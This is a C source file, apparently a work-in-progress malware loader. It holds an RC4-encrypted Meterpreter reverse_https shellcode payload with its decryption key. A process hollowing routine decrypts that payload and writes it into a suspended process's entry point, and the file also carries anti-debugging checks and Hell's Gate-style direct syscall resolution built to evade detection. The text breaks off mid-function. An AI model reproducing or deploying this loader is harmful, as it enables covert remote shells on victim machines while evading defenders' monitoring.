#include <stdio.h>
#include <stdint.h>
#include <Windows.h>
#include "typedef.h"

//Hells Gate Additions
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD dwHash;
    WORD    wSystemCall;
    WORD    wRCXVal;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY Allocate;
    VX_TABLE_ENTRY Protect;
    VX_TABLE_ENTRY Read;
    VX_TABLE_ENTRY Write;
    VX_TABLE_ENTRY ResumeThread;
    VX_TABLE_ENTRY QueryInfoProcess;
    VX_TABLE_ENTRY CreateUserProcess;
    VX_TABLE_ENTRY CreateProcessParametersEx;
    VX_TABLE_ENTRY InitUnicodeString;
    VX_TABLE_ENTRY OpenProcess;

} VX_TABLE, * PVX_TABLE;
    
//PVOID* pSystemCalls = NULL; //allocate PVOID * dwDLLSize memory for our array of pointers

#define num_syscalls 50 //kinda expiremental , i sorta wnat this defined early on so i can just in and start populating
PVOID* pSystemCalls[num_syscalls];
VX_TABLE VxTable = { 0 };
void initializeSystemCalls() {
    
    if (pSystemCalls == NULL) {
        printf("Mem allocation error\n");
        exit(1);
    }
    printf("Address of pSystemCalls(it should all be zero'd....: 0x%p\n", pSystemCalls);

    printf("Size of pSystemCalls %zu\n", num_syscalls);
}
// this is what SystemFunction032 function take as a parameter
typedef struct
{
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );
//Maldev Academy Rc4
BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // the return of SystemFunction032
    NTSTATUS        STATUS = NULL;

    // making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


    // since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
    // and using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    // if SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}

//met x64 reverse_https payload
unsigned char Rc4CipherText[] = {
        0xA8, 0xA4, 0xCE, 0x2A, 0x86, 0xD4, 0xB6, 0x85, 0x19, 0xCC, 0x21, 0x61, 0xE1, 0xC3, 0x07, 0xFD,
        0x80, 0xFB, 0x43, 0x61, 0x3C, 0x6D, 0x2C, 0xD2, 0x15, 0xE0, 0xD9, 0x01, 0x34, 0x70, 0x0B, 0xDA,
        0x4C, 0x76, 0x71, 0x77, 0xB1, 0x30, 0xED, 0x27, 0x98, 0x6B, 0xE3, 0x04, 0x6B, 0xD6, 0x14, 0x02,
        0x36, 0xE0, 0xAF, 0x27, 0x7C, 0x6B, 0x0B, 0x6B, 0x2F, 0x96, 0xC5, 0xE5, 0x85, 0x8D, 0x70, 0x06,
        0xBC, 0x8E, 0xA1, 0x65, 0xDB, 0x2A, 0x93, 0x7B, 0x29, 0x07, 0xA9, 0xC9, 0x79, 0xDD, 0x84, 0xAB,
        0xDE, 0x52, 0xD0, 0xD8, 0xF4, 0xF9, 0xCE, 0x08, 0xC3, 0xA7, 0x6B, 0x95, 0x27, 0x40, 0x6A, 0xE9,
        0xB5, 0x38, 0xC3, 0x72, 0x89, 0xCA, 0x6A, 0xA8, 0xA2, 0xE8, 0x09, 0x09, 0xA7, 0x02, 0xA6, 0xB3,
        0x37, 0x39, 0xF3, 0x0D, 0xBA, 0x80, 0xF6, 0x20, 0x38, 0xC1, 0x49, 0x50, 0x4D, 0xB8, 0xCB, 0x50,
        0xAB, 0x6E, 0x69, 0xFA, 0x49, 0xBC, 0x53, 0x4D, 0x82, 0xC2, 0x09, 0x61, 0xF5, 0x7B, 0x62, 0x1B,
        0x56, 0xA8, 0x5F, 0xEF, 0xC4, 0xFD, 0xC8, 0xC9, 0x37, 0x84, 0xF5, 0x55, 0x9A, 0xAE, 0xC9, 0x11,
        0x83, 0x29, 0x16, 0xD3, 0xA1, 0x34, 0x37, 0x2A, 0x6D, 0x73, 0x6E, 0x72, 0x85, 0x1F, 0xD7, 0xC3,
        0x31, 0x1F, 0x6C, 0xEA, 0x78, 0x58, 0x9F, 0xF4, 0x50, 0x8E, 0xF5, 0x26, 0xC9, 0x7F, 0x87, 0x1D,
        0x4C, 0x8C, 0x6E, 0xF0, 0xC0, 0xAE, 0x05, 0xE0, 0xDD, 0xEE, 0x28, 0xDF, 0x39, 0x17, 0x53, 0x42,
        0xFD, 0xDC, 0x00, 0xBD, 0x31, 0xD8, 0xA0, 0x39, 0x3C, 0x56, 0x89, 0x86, 0x6E, 0x83, 0x32, 0x4B,
        0xBD, 0x1A, 0x0E, 0xFB, 0xA8, 0x11, 0xC6, 0x9F, 0xB1, 0x7A, 0x42, 0x49, 0x84, 0x52, 0x6B, 0xB2,
        0xE6, 0xE6, 0x24, 0x0F, 0x6D, 0x42, 0xD8, 0x65, 0x3B, 0x0C, 0x96, 0x38, 0x87, 0xDD, 0xA4, 0x48,
        0xA5, 0x4C, 0x15, 0xEC, 0x69, 0x95, 0x19, 0x89, 0xD3, 0xB8, 0xD6, 0xB5, 0xAF, 0xC2, 0xF2, 0xD7,
        0x32, 0x95, 0xA5, 0x23, 0x97, 0x79, 0x2C, 0x76, 0x18, 0x84, 0x07, 0xC8, 0xC6, 0xA2, 0xE0, 0x0D,
        0x5D, 0x14, 0x18, 0x05, 0x1F, 0x3B, 0x19, 0xCD, 0xC3, 0xDB, 0x64, 0x25, 0x77, 0x10, 0xCE, 0x27,
        0x6F, 0xFA, 0xDD, 0x59, 0x62, 0x80, 0x09, 0xC1, 0x8E, 0x68, 0x1E, 0xCC, 0xE7, 0x2B, 0xA3, 0xF6,
        0x00, 0xFB, 0x13, 0xC7, 0x2E, 0x00, 0xD8, 0x35, 0x7D, 0xF3, 0xCB, 0x52, 0x64, 0x0E, 0x2B, 0x60,
        0x7A, 0xF6, 0xFF, 0x7E, 0x70, 0x8D, 0xA4, 0x08, 0xB3, 0xD5, 0x8C, 0xBB, 0x79, 0xF5, 0x5D, 0x4D,
        0x4B, 0x0E, 0xE5, 0x67, 0xA0, 0x51, 0xDE, 0x12, 0x79, 0x02, 0xA6, 0x2A, 0x9B, 0x66, 0x75, 0x41,
        0xE7, 0x21, 0xBA, 0xDD, 0x1E, 0x50, 0x98, 0xF2, 0x36, 0x39, 0x41, 0x96, 0xE4, 0x1C, 0x7C, 0x25,
        0xC9, 0xCF, 0xF0, 0x0B, 0x43, 0x11, 0xC6, 0x41, 0xA7, 0x86, 0x93, 0x10, 0x2E, 0x0A, 0xCE, 0xFF,
        0x23, 0x7D, 0xB4, 0xF5, 0x5C, 0x0B, 0xA1, 0x3F, 0x34, 0x95, 0x48, 0x62, 0x43, 0x9A, 0x98, 0x0A,
        0x08, 0xA8, 0xD0, 0xA3, 0x95, 0xE3, 0xB3, 0xAB, 0x13, 0x1D, 0x9A, 0x42, 0xB8, 0x57, 0xE1, 0x0E,
        0x8F, 0x43, 0x31, 0x5F, 0xEA, 0xE0, 0x09, 0x68, 0x89, 0x99, 0xC6, 0xEB, 0xC6, 0xA9, 0x3D, 0x3A,
        0x1B, 0x2E, 0x70, 0x27, 0x9A, 0xD2, 0x4E, 0x4A, 0xCD, 0xF4, 0xAA, 0x07, 0x9B, 0x8D, 0xA0, 0xA4,
        0x91, 0x06, 0xA0, 0x31, 0xA3, 0xF1, 0x33, 0x55, 0x36, 0x16, 0xE5, 0x28, 0xBA, 0x05, 0xAA, 0xFF,
        0xF9, 0x62, 0xB3, 0x7B, 0x02, 0x0E, 0x5A, 0x7D, 0x83, 0x87, 0xB2, 0xE0, 0x14, 0xFF, 0x2A, 0xD9,
        0xA8, 0x4E, 0xD6, 0x16, 0x0D, 0x29, 0x84, 0xD8, 0xC9, 0xC3, 0xF0, 0xE9, 0xEB, 0x40, 0xE2, 0x70,
        0x79, 0x66, 0xD4, 0xFF, 0xA5, 0xC2, 0x81, 0xE7, 0x47, 0x8F, 0xAA, 0xD5, 0xC7, 0x3A, 0x6C, 0xCE,
        0x63, 0xDF, 0x60, 0x46, 0x3B, 0xEE, 0x55, 0x6B, 0x33, 0xEB, 0x4F, 0x34, 0x2D, 0xA0, 0xAC, 0x04,
        0xCA, 0xB7, 0x70, 0xF8, 0x5A, 0x5D, 0xCC, 0xF6, 0x52, 0x26, 0x12, 0xE6, 0xD3, 0x12, 0xE3, 0x66,
        0xFE, 0xD6, 0xF3, 0xEB, 0xDA, 0x4F, 0xBB, 0xA5, 0x03, 0xD4, 0xA7, 0x3D, 0xDC, 0xF3, 0xE6, 0xEC,
        0x2C, 0xCE, 0xBE, 0x81, 0xC2, 0x59, 0xB7, 0xB1, 0x5D, 0xF2, 0x0E, 0x99, 0x01, 0x02, 0xA2, 0xD3,
        0xE4, 0xCE, 0x3F, 0xC2, 0x34, 0xAB, 0x36, 0xD1, 0xCD, 0x0D, 0x4A, 0xF7, 0x09, 0x64, 0xE0, 0xE8,
        0x71, 0x5D, 0x30, 0x65, 0xD6, 0x8E, 0x0C, 0x0E, 0x61, 0xB2, 0xEE, 0xC3, 0x04, 0x44, 0x09, 0xBF,
        0x22, 0x37, 0xDB, 0x9E, 0x64, 0x82, 0x59, 0xC1, 0xB2, 0xE8, 0xEC, 0x7A, 0x56, 0xC7, 0x08, 0x66,
        0x13, 0x73, 0xBE, 0xCA, 0xB9, 0xA0, 0xDD, 0xF3, 0x63, 0x40, 0xF4, 0xC9, 0xDA, 0xCD, 0x40, 0x21,
        0x5A, 0x52, 0xF5, 0xEF, 0xE1, 0xBD, 0x7E, 0x91, 0x66, 0x35, 0x11, 0x58, 0x59, 0xDA, 0xD1, 0x79,
        0xD1, 0x0F, 0x49, 0x45, 0xC2, 0xA7, 0x8C, 0xA6, 0xA0, 0x95, 0x93, 0xDF, 0x69, 0xD3, 0xC1, 0x5A,
        0x19, 0x24, 0xF4, 0x39, 0x37, 0xD3, 0x0A, 0xF7, 0x90, 0xBB, 0x2A, 0x0D, 0xBC, 0x65, 0x43, 0x24,
        0x23, 0xE1, 0x23, 0x65, 0xBE, 0xE5, 0x5E, 0x96, 0xA5, 0x85, 0x4D, 0xD4, 0xEC, 0x00, 0x2C, 0x9C,
        0xC1, 0x5D, 0xB8, 0xB6, 0x8D, 0xE4, 0x55, 0x89, 0x82, 0x79, 0xB5, 0x2C, 0x9F, 0x6B, 0x23, 0xC4,
        0x07, 0x4D, 0x9C, 0x00, 0x12, 0xC1, 0x6F, 0x1A, 0x07, 0x42, 0x48, 0x1F, 0xB5, 0xE1, 0xE9, 0x9D,
        0xFE, 0x79, 0x38, 0x3A, 0x8F, 0x99, 0x2D, 0x20, 0x40, 0x91, 0x56, 0x0F, 0xD7, 0x70, 0x79, 0xC6,
        0x8C, 0xBB, 0x82, 0x28, 0xAC };

DWORD gSSN = 0;
PVOID gJMP = NULL;
WORD gCurrentSyscall = 0;


unsigned char Rc4Key[] = {
        0xAD, 0x09, 0x40, 0xE9, 0x73, 0xF5, 0x00, 0x57, 0x5D, 0xD8, 0xAE, 0x89, 0x53, 0x8E, 0x05, 0x5D };

void printByteArray(const unsigned char* array, size_t size) {
    printf("Contents of the byte array:\n");
    for (size_t i = 0; i < size; ++i) {
        printf("%02X ", array[i]); // Print each byte in hexadecimal format
    }
    printf("\n", array);
}

BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload, HANDLE hProcess, HANDLE hThread) {
    
    printf("Size payload: %d\n", sPayload);


    //Now that we have the query process ifnormation syscall we can find the entry point of the process handle being passed
    //to do this we first find the PEB then using offsets calculate the entry point

    //step 1. find the PEB
    //  _Out_     PVOID            ProcessInformation,

    PROCESS_BASIC_INFORMATION basicInformation = { 0 };
    printf("PROCESS ID: %d\n\n", Pi.dwProcessId);
    //ProcessBasicInformaiton is a flag defined in the docs to retreive a pointer to ProcessBasicInformation struct when set to ProcessBasicInformation.
    //NtQueryProcessInformationPtr myNtQueryProcessInformation1 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");

    //myNtQueryProcessInformation1(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);

    gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
    //NTSTATUS result = NoahRead3(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
    NTSTATUS result = NoahRead3(hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
    printf("NTSTATUS????? %d", result);
    //syscalls.myNtQueryProcessInformation(Pi.hProcess,ProcessBasicInformation)
    printf("PEB: 0x%p\n", basicInformation.PebBaseAddress);

    //Now with PEB get offsets to image entry point 

    uintptr_t BaseAddress = (uintptr_t)basicInformation.PebBaseAddress + 0x10;//
    BYTE procAddr[64];
    BYTE procAddr2[64];

    BYTE dataBuff[0x200];
    SIZE_T bytesRW = 0;
    // THis 64 is based on the architecture used...
    
    //BOOL result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
    //BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
    printf("Base Address: 0x%p\n", BaseAddress);
    //getchar();
    printf("Starting NoahRead\n");
    //getchar();


    //working - BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);

    //BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);

   // BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
    
   
   // printf("RESULTSS????? %d, %d\n", result, bytesRW);
    getchar();
    gCurrentSyscall = VxTable.Read.wRCXVal;
    //result = NoahRead3(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
    result = NoahRead3(hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
    getchar();
    printf("Enging NoahRead\n");
    
    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
    printf("&Proc Address (Working): 0x%p\n", *procAddr);
    printf("&Proc Address (Noah): 0x%p\n", *procAddr2);

    getchar();
    uintptr_t executableAddress = *((uintptr_t*)procAddr);//
    
    //result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
    //result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), & bytesRW);
    gCurrentSyscall = VxTable.Read.wRCXVal; // just for clairty
    //result = NoahRead3(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
    result = NoahRead3(hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);

    unsigned int e_lfanew = *((unsigned int*)(dataBuff + 0x3c));
    unsigned int rvaOffset = e_lfanew + 0x28;

    unsigned int rva = *((unsigned int*)(dataBuff + rvaOffset));

    uintptr_t entrypointAddr = executableAddress + rva;
    PVOID test = (PVOID)entrypointAddr;
    ULONG sizer = sPayload;
    DWORD oldPerm = PAGE_EXECUTE_READWRITE;

    printf("Entrypoint: 0x%lp\n", test);
    printf("Size payload: %d", sPayload);

    PVOID sizeTest = (PVOID)sPayload;

    //BOOL results = syscalls.myNtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
    //result = Sw3NtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
    gCurrentSyscall = VxTable.Protect.wRCXVal;
    printf("gCurrentSyscall: %d\n", gCurrentSyscall);
    printf("Protect Num: %d\n", VxTable.Protect.wRCXVal);
    //result = NoahRead3(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
    result = NoahRead3(hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, oldPerm);
    
    
    //    BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);
    //BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);

    printf("Address of optional header offset: 0x%p\n", e_lfanew);
    printf("Address of entrypoint rva offset: 0x%p\n", rvaOffset);
    printf("Executable ADDR: 0x%lp\n", executableAddress);
    printf("Entrypoint ADDR: 0x%lp\n", test);
    printf("Entrypoint: 0x%lp\n", entrypointAddr);
    printf("Change Perms: %X\n", result);
    getchar();

    printf("\nentrypoint: 0x%p\n", entrypointAddr);
    printf("pvoid entrypoint pvoid: 0x%p\n", (PVOID)entrypointAddr);
    printf("(PVOID)Test pvoid: 0x%p\n", (PVOID)test);
    printf("&Test pvoid : 0x % p\n", &test);
    printf("Test : 0x%p\n", test);

    getchar();
    ULONG read = 0;
    
    //BOOL bruh = syscalls.myNtWriteVirtualMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
    Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText)); //Allow as little time to analzye payload a spossible, decrypt just before write
    
    //BOOL bruh = Sw3NtWriteVirtualMemory(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
    gCurrentSyscall = VxTable.Write.wRCXVal;
   // result = NoahRead3(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
    result = NoahRead3(hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);

    // St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)
    //WriteProcessMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);

    //if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {

    //results = syscalls.myNtWriteVirtualMemory(Pi.hProcess, (LPVOID)entrypointAddr, truePayload, sizeof(truePayload), &numBytesWritten);
    //results =  (Pi.hProcess, (LPVOID)test, truePayload, sizeof(truePayload), &bytesRW);
    printf("WRote @ Address of entrypoint offset: 0x%p\n", test);
    printByteArray(Rc4CipherText, sizeof(Rc4CipherText));
    getchar();
    
    //ResumeThread(Pi.hThread);
    PULONG suspendCount;

    //Sw3NtResumeThread(Pi.hThread, &suspendCount);
    gCurrentSyscall = VxTable.ResumeThread.wRCXVal;
    //result = NoahRead3(Pi.hThread, &suspendCount);
    result = NoahRead3(hThread, &suspendCount);
    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, suspendCount);
}

void detectDebug() {
    // Calling NtQueryInformationProcess with the 'ProcessDebugPort' flag

    DWORD64 isDebuggerPreset = 0;
    
    //NtQueryProcessInformationPtr myNtQueryProcessInformation2 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
    gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
    BOOL STATUS = NoahRead3(
        GetCurrentProcess(),
        ProcessDebugPort,
        &isDebuggerPreset,
        sizeof(DWORD64),
        NULL
    );

    if (isDebuggerPreset != NULL) {
        // detected a debugger
        printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");
        return TRUE;
    }
    printf("No debugger present...\n");
    DWORD64 hProcessDebugObject = NULL;

    STATUS = NoahRead3(
        GetCurrentProcess(),
        ProcessDebugObjectHandle,
        &hProcessDebugObject,
        sizeof(DWORD64),
        NULL
    );

    // If STATUS is not 0 and not 0xC0000353 (that is 'STATUS_PORT_NOT_SET')
    if (STATUS != 0x0 && STATUS != 0xC0000353) {
        printf("\t[!] NtQueryInformationProcess [2] Failed With Status : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    // If NtQueryInformationProcess returned a non-zero value, the handle is valid, which means we are being debugged
    if (hProcessDebugObject != NULL) {
        // detected a debugger
        printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");
        //return TRUE;
    }
    printf("No process debuger object present...\n");

    return FALSE;
}

#define NEW_STREAM L":Noah"
BOOL DeletesSelf() {

//still need to go back and make this myself
}


//Also not that this is essentially a custom GetModuleHandle??? 
void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr) {
    PPEB_LDR_DATA ldr = pPEB->Ldr;
    PLIST_ENTRY listEntry = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = listEntry->Flink;

    printf("Entry found:\n");
    while (entry != listEntry) {
        PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (tableEntry->BaseDllName.Buffer) {
            // Print the module name (wide character string)
            wprintf(L"%ls\n", tableEntry->BaseDllName.Buffer);
        }

        if (tableEntry->BaseDllName.Buffer && wcscmp(tableEntry->BaseDllName.Buffer, L"ntdll.dll") == 0) {
            *pBaseAddr = tableEntry->DllBase;
            return; // Successfully found and assigned the base address
        }

        entry = entry->Flink; // Move to the next entry
    }
    *pBaseAddr = NULL; // No match found, set base address to NULL
}

uint64_t pTextSection = NULL;
DWORD sTextSection = 0;
void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory, DWORD* dwDllSize) {

    PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)pModuleBase; //Get a PIMAGE_DOS_HEADER struct from the modyle base 
                                                                        //so we get access to NT headers

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDOSHeader->e_lfanew); 

    //This is to find the beginning of the .text sectoin of NTDLL so we can limit the scope of syscall opcodes to only wihtin their
    PIMAGE_SECTION_HEADER pImageSectionHeaders = IMAGE_FIRST_SECTION(pImageNtHeaders); // a macro to essentially go from base address of NtHeaders then add offset to optional header, then adding size of optional header to get the first section.
    WORD wNumberSection = pImageNtHeaders->FileHeader.NumberOfSections;
    //Now from the NT header we can extract the export address table for all fucntions within the dll
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    *dwDllSize = pImageNtHeaders->OptionalHeader.SizeOfHeaders + pImageNtHeaders->OptionalHeader.SizeOfImage;
    
    for (int i = 0; i < wNumberSection; i++, pImageSectionHeaders++) {
        
        if (strcmp((char*)pImageSectionHeaders[i].Name, ".text") == 0) {
            printf("Section: %s | 0x%p,\n", pImageSectionHeaders[i].Name, pImageSectionHeaders[i].VirtualAddress);
            pTextSection = (uint64_t)((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress);
            sTextSection = pImageSectionHeaders[i].Misc.VirtualSize;
            printf("Text Section NTDLL Pointer: 0x%p\nSize of .text Section: %d\n", pTextSection,sTextSection);

        }
    }

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    DWORD byteCounter = 0;
    WORD counter = 0;

    //this is defffff! the way to go. just loop through all the exported functions - find our sybscall - and move onto the next
    // - particularly like because we avoind needing to filter out syscall opcodes outside of the systemcalls themselves within ntdll
    //BOOL go = TRUE;
    for (int i = 0; i < pImageExportDirectory->NumberOfFunctions; i++) {
        DWORD dwFunRVA = addressOfFunctions[addressOfNameOrdinals[i]];
        PBYTE pbFuncAddress = (PBYTE)pModuleBase + dwFunRVA;
       // go = TRUE;
        //I do recognize that due to the lack of while loop we are getting "lucky" per say 
            if (
                (*(pbFuncAddress + byteCounter) == 0x0f) && (*(pbFuncAddress + byteCounter + 1) == 0x05)
                ) {
                
                PBYTE opcode1 = *((PBYTE)pbFuncAddress + byteCounter);
                PBYTE opcode2 = *((PBYTE)pbFuncAddress + byteCounter + 1);
                printf("IS THIS WORKING?????? 0x%p : %02X %02X\n", (pbFuncAddress + byteCounter), opcode1, opcode2);
                pSystemCalls[counter] = (PVOID)((PBYTE)pbFuncAddress + byteCounter);
                counter++;
                byteCounter = 0;
                
            }
            byteCounter++;
        
        
    }
    return TRUE;
    //While we're getting image export directory we can also populate the systemcalls list
}

// generate Djb2 hashes from wide-character input string

#define INITIAL_HASH	3731		// added to randomize 
#define INITIAL_SEED	7			// recommended to be 0 < INITIAL_SEED < 10

DWORD HashStringDjb2A(_In_ PCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;

    while (c = *String++)
        Hash = ((Hash << INITIAL_SEED) + Hash) + c;

    return Hash;
}


BOOL GetVXTableEntry(DWORD dwDLLSize,PVOID* pSystemCalls ,PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, OUT PVX_TABLE_ENTRY syscallTableEntry) {

    //Using our image export directory from the GetImageExportDir function we can use to find # of functions, function names, and the locations 
    //of those functions within their respect RVA arrays
    //Note that since they're RVA's they need to be added onto the module base address/
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals); // NOTE THIS IS A PWORD NOT A PDWORD... yeah that took about an hr of debugging to fix
    
    //Then we seasrch through all the functions for a function name hash that matches ours
    for (WORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[i]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];
        
     
        if (HashStringDjb2A(pczFunctionName) == syscallTableEntry->dwHash) {
            printf("FOUND!!\n");
            printf("Function Address 0x%p\n", pFunctionAddress);
            printf("Function Name %s\n", pczFunctionName);
            printf("A: 0x%0.8X\n", HashStringDjb2A(pczFunctionName));
            printf("B: 0x%0.8X\n", syscallTableEntry->dwHash);
            
            syscallTableEntry->pAddress = pFunctionAddress; // I got issues landing on ret a lot and this fixed it?
            printf("0x%p", syscallTableEntry->pAddress);
            getchar();
            //hells gate on github will perform a test to see if the fucntion has been hooked -To Do list is to add maldev academy syscallhook testing here
            // 
           //Now we will search the opcodes for byte sequences relating to system calls!


            //oh wow this is actually like incredibly simple....
            WORD byteCounter = 0;
            while (TRUE) {
                //pFunctionAddress = *((PBYTE)pFunctionAddress - 10);
                //First check if pFunctionAddress is the syscall itself, if so we need to go up to start of syscall sturcture
                //Recall syscall  = 0x0f, 0x05
                //Adding 0x01 onto the memory address value every time then taking the actual value by de-referencing pointer w *
                //to see what the legit opcode is
                if (*((PBYTE)syscallTableEntry->pAddress + byteCounter) == 0x0f && *((PBYTE)pFunctionAddress + byteCounter + 1) == 0x05) {
                    printf("Landed on `syscall` or incremented too far\n");
                    return FALSE;
                }
                //Now check for ret as well
                if (*((PBYTE)syscallTableEntry->pAddress + byteCounter) == 0xc3) {
                    printf("Landed on `ret` or incremented too far\n");
                    return FALSE;
                }
                // NOTE THE OPCODES OF A PROPER SYSCALL IN WIN64 SHOULD BE:
                // mov r10,rcx
                // mov rcx,SSN
                //
                //in your head just think - dereference - pbyte - location
                if (
                    *((PBYTE)pFunctionAddress + byteCounter) == 0x4c &&
                    *((PBYTE)pFunctionAddress + byteCounter + 1) == 0x8b &&
                    *((PBYTE)pFunctionAddress + byteCounter + 2) == 0xd1 &&
                    *((PBYTE)pFunctionAddress + byteCounter + 3) == 0xb8 &&
                    *((PBYTE)pFunctionAddress + byteCounter + 6) == 0x00 && // NOTE PLUS 6 OFFSET
                    *((PBYTE)pFunctionAddress + byteCounter + 7) == 0x00    // NOTE PLUS 7 OFFSET
                    ) {

                    //Now we need to calculate the actual systemcall number which we use 4 & 5 for.
                    //
                        BYTE high = *((PBYTE)pFunctionAddress + 5 + byteCounter); // Offset 5
                        BYTE low = *((PBYTE)pFunctionAddress + 4 + byteCounter); // Offset 4
                    
